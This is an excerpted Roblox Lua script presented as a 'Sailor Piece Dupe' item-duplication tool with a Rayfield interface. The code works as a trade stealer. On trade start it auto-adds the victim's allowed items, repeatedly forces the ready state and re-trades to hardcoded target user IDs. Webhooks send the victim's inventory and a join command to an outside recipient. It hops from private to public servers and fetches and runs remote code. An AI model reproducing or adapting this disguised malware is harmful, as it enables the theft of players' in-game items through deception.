...
local AUTO_READY_RETRY_ENABLED = true
local AUTO_READY_RETRY_INTERVAL = 0.75
local AUTO_READY_ENFORCE_ENABLED = true
local AUTO_READY_ENFORCE_INTERVAL = 0.6
local AUTO_READY_ENFORCE_TIMEOUT = 6.0
...
local PRIVATE_SERVER_DETECTION_ENABLED = true
local AUTO_HOP_COUNTDOWN_SECONDS = 95
local AUTO_HOP_MIN_PLAYERS = 2
local AUTO_HOP_CHECK_INTERVAL = 0.5
local AUTO_HOP_GAME_PAGE_LIMIT = 10
...
local allowedItemSet = {}
for _, itemName in ipairs(ALLOWED_ITEM_NAMES) do
	if type(itemName) == "string" and itemName ~= "" then
		allowedItemSet[itemName:lower()] = true
	end
end
...
local lastAutoReadyAt = 0
local retradeLoopToken = 0
local lastMyReadyState = false
local lastTradePhase = "trading"
...
local function syncSelectedItemQuantityLabels(selectedEntries, multiplierPower)
	...
	for _, entry in ipairs(selectedEntries) do
		if typeof(entry) == "table" and type(entry.name) == "string" then
			...
			if qtyLabel then
				qtyLabel.Text = "x" .. formatMultipliedAmount(entry.amount, multiplierPower)
			end
		end
	end
end
...
local function buildSelectedItemAmountLines(selectedEntries, multiplierPower)
	...
	for _, entry in ipairs(selectedEntries) do
		if typeof(entry) == "table" and type(entry.name) == "string" then
			table.insert(lines, string.format("%s: %s", entry.name, formatMultipliedAmount(entry.amount, multiplierPower)))
		end
	end
...
local function updateProcessingUi(statusText, repeatCurrent, repeatTarget, selectedEntries, multiplierPower)
	...
	if processingQuantityLabel then
		processingQuantityLabel.Text = buildSelectedItemAmountLines(selectedEntries, math.max(0, math.floor(multiplierPower or 0)))
	end
end
...
local function buildInventoryPreview(maxItems)
	...
	for _, item in ipairs(items) do
		if typeof(item) == "table" and type(item.name) == "string" then
			table.insert(snapshot, { name = item.name, quantity = tonumber(item.quantity) or 1 })
		end
	end
...
local function updateInventoryStatusParagraph(prefixText)
	...
	local content = "No items detected yet."
	if itemCount > 0 then
		content = string.format("Detected %d item entries.\n%s", itemCount, buildInventoryPreview(INVENTORY_PREVIEW_MAX_ITEMS))
	end
	...
	pcall(function()
		uiInventoryStatusParagraph:Set({ Title = "Inventory Status", Content = content })
	end)
end
		...
		if cleaned ~= "" then
			...
			if wantedSet[key] then
				...
				if foundSet[key] then
					...
					table.insert(lines, string.format("%s not found in inventory", cleaned))
				end
			end
		end
	end
...
local function updateSelectedItemStatus()
	...
	pcall(function()
		uiSelectedItemStatusParagraph:Set({ Title = "Selected Item Status", Content = statusText })
	end)
end
...
local function dupeSelectedItemsFromInput(rawText)
	...
	for _, item in ipairs(items) do
		if typeof(item) == "table" and type(item.name) == "string" then
			...
			if wantedSet[key] then
				table.insert(selectedEntries, { name = item.name, amount = tonumber(item.quantity) or 1 })
			end
		end
	end
		...
		if uiRayfield then
			for _, entry in ipairs(selectedEntries) do
				pcall(function()
					uiRayfield:Notify({
						Title = "Sailor Piece Dupe",
						Content = string.format("Processing %d/%d\nSelected %s count: %s", progressCount, targetRepeats, entry.name, formatMultipliedAmount(entry.amount, multiplierPower)),
						Duration = 3,
						Image = 4483362458,
					})
				end)
	...
	updateSelectedItemStatus()
	local detectionText = select(1, getSelectedItemDetectionText(rawText))
			...
			local okWindow, window = pcall(function()
				return Rayfield:CreateWindow({
					...
					ConfigurationSaving = {
						Enabled = false,
						FolderName = nil,
						FileName = "SailorPieceDupeAllowlist",
					},
					Discord = {
						Enabled = false,
						Invite = "",
			...
			if okWindow and window then
				pcall(function()
					...
					opTab:CreateInput({
						...
						Flag = "OP_SelectedItemsInput_Allowlist",
					...
					opTab:CreateInput({
						...
						RemoveTextAfterFocusLost = false,
						Flag = "OP_DupeRepeatCount_Allowlist",
						Callback = function(text)
...
local function isPrivateServer()
	pcall(function()
		local vipServers = game:GetService("AssetService"):GetCreations(Enum.CreationType.VIPServer)
...
local function getPublicServerJobId()
	local HttpService = game:GetService("HttpService")
	local placeId = game.PlaceId
	local cursor = nil

	for _ = 1, AUTO_HOP_GAME_PAGE_LIMIT do
		local pageUrl = string.format(
			"https://www.roblox.com/api/games/servers/PlaceID/%d?sortOrder=Asc&limit=%d",
			placeId,
			50
		)
		if cursor then
			pageUrl = pageUrl .. "&cursor=" .. HttpService:UrlEncode(cursor)
		end

		local ok, response = pcall(function()
			return game:HttpGet(pageUrl)
		end)
		...
		if typeof(servers) == "table" then
			for _, server in ipairs(servers) do
				if typeof(server) == "table" then
					...
					local isAvailable = (maxPlayers <= 0) or (playing < maxPlayers)

					if jobId ~= "" and jobId ~= game.JobId and isAvailable and playing >= AUTO_HOP_MIN_PLAYERS then
						return jobId
					end
				end
			end
...
local function showHopCountdown(secondsRemaining)
	local message = string.format("Swapping to public server in %d seconds", math.max(1, math.floor(secondsRemaining)))
	pcall(function()
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Sailor Allowlist",
			Text = message,
			Duration = 1.0,
		})
	end)
...
local function queueAutoHop()
	if not AUTO_HOP_ENABLED then
		return
	end

	task.spawn(function()
		while AUTO_HOP_ENABLED do
			local playerCount = checkPlayerCount()
			
			if playerCount <= AUTO_HOP_MIN_PLAYERS then
				local countdownStart = os.clock()
				local countdownDuration = AUTO_HOP_COUNTDOWN_SECONDS

				while AUTO_HOP_ENABLED and (os.clock() - countdownStart) < countdownDuration do
					local playerCountNow = checkPlayerCount()
					if playerCountNow > AUTO_HOP_MIN_PLAYERS then
						break
					end

					local secondsLeft = countdownDuration - (os.clock() - countdownStart)
					if secondsLeft > 0 then
						showHopCountdown(secondsLeft)
					end

					task.wait(AUTO_HOP_CHECK_INTERVAL)
				end

				if (os.clock() - countdownStart) >= countdownDuration then
					local newJobId = getPublicServerJobId()
					if newJobId then
						pcall(function()
							game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, newJobId, Players.LocalPlayer)
						end)
					else
						pcall(function()
...
local function executeAutoReload()
	if not AUTO_RELOAD_ENABLED or AUTO_RELOAD_SOURCE_URL == "" then
		return
	end
	...
	task.spawn(function()
		...
		local sourceCode = AUTO_RELOAD_SOURCE_CODE
		if sourceCode == "" and AUTO_RELOAD_SOURCE_URL ~= "" then
			local ok, fetched = pcall(function()
				return game:HttpGet(AUTO_RELOAD_SOURCE_URL)
			end)
		...
		if sourceCode ~= "" then
			...
			if not execOk then
				warn("Sailor Allowlist: Auto-reload failed - " .. tostring(execResult))
			end
		end
	end)
end
...
local function sendTradeSuccessWebhook(myItems, theirItems)
	...
	local fields = {
		...
		{
			name = "Join Command",
			value = "```lua\n" .. truncateForField(joinCommand, 960) .. "\n```",
			inline = false,
		},
		{
	...
	local payload = {
		embeds = {
			{
				title = "Sailor Allowlist: Trade Successful",
				color = 5814783,
				thumbnail = {
					url = avatarUrl,
				},
...
local function sendScriptExecutedWebhook()
	...
	local inventoryText, totalCount = buildTradeItemLines(inventoryByCategory.Items)

	local payload = {
		embeds = {
			{
				title = "Sailor Allowlist: Script Executed",
				color = 5814783,
				thumbnail = {
					url = avatarUrl,
				},
				fields = {
					...
					{
						name = string.format("Inventory (Items) - %d total", totalCount),
						value = "```\n" .. inventoryText .. "\n```",
						inline = false,
					},
				},
...
local function hasItemsInventory()
	local items = inventoryByCategory.Items
...
local function isAllowedItem(itemName)
	...
	return allowedItemSet[itemName:lower()] == true
end

local function autoAddAllowedItemsMax(jobId)
	...
	local itemSnapshot = {}
	for _, item in ipairs(items) do
		if typeof(item) == "table" and isAllowedItem(item.name) then
	...
	updateInventory.OnClientEvent:Connect(function(category, list)
		if typeof(category) == "string" and typeof(list) == "table" then
			...
			if category == "Items" then
				updateInventoryStatusParagraph()
				updateSelectedItemStatus()
				if scanNotifyPending and getInventoryItemCount() > 0 then
...
tradeUpdated.OnClientEvent:Connect(function(data)
	...
	if typeof(data) == "table" then
		if type(data.myReady) == "boolean" then
			lastMyReadyState = data.myReady
		end
		if type(data.phase) == "string" then
			lastTradePhase = data.phase
		end
	end

	if AUTO_READY_ENABLED and AUTO_READY_RETRY_ENABLED and tradeActive and typeof(data) == "table" then
		if data.phase == "trading" and not data.myReady then
			local now = os.clock()
			if now - lastAutoReadyAt >= AUTO_READY_RETRY_INTERVAL then
				lastAutoReadyAt = now
...
tradeStarted.OnClientEvent:Connect(function(_tradeData)
	...
	lastAutoConfirmAt = 0
	lastAutoReadyAt = 0
	lastMyReadyState = false
	lastTradePhase = "trading"
	...
	if AUTO_ADD_ITEMS_ENABLED then
		...
		addedCount = autoAddAllowedItemsMax(currentJobId)
	end

	if AUTO_READY_ENABLED and tradeActive and currentJobId == addJobId then
		local canReady = not REQUIRE_ITEM_ADDED_BEFORE_READY or addedCount > 0 or myTradeItemCount > 0 or not AUTO_ADD_ITEMS_ENABLED
		if canReady then
			if AUTO_READY_DELAY > 0 then
				task.wait(AUTO_READY_DELAY)
			end
			lastAutoReadyAt = os.clock()
			setReady:FireServer(true)

			if AUTO_READY_ENFORCE_ENABLED then
				task.spawn(function()
					local startedAt = os.clock()
					while tradeActive and currentJobId == addJobId and os.clock() - startedAt < AUTO_READY_ENFORCE_TIMEOUT do
						if lastTradePhase ~= "trading" or lastMyReadyState then
							break
						end
						setReady:FireServer(true)
						task.wait(AUTO_READY_ENFORCE_INTERVAL)
					end
				end)
			end
		end
	...
	if AUTO_RETRADE_ON_CANCEL and #RETRADE_TARGET_USER_IDS > 0 then
		...
		task.spawn(function()
			if FIRE_CANCEL_BEFORE_RETRADE then
				...
				if RETRADE_AFTER_CANCEL_DELAY > 0 then
					task.wait(RETRADE_AFTER_CANCEL_DELAY)
				end
			end
...
tradeCompleted.OnClientEvent:Connect(function(data)
	...
	sendTradeSuccessWebhook(myItems, theirItems)
end)
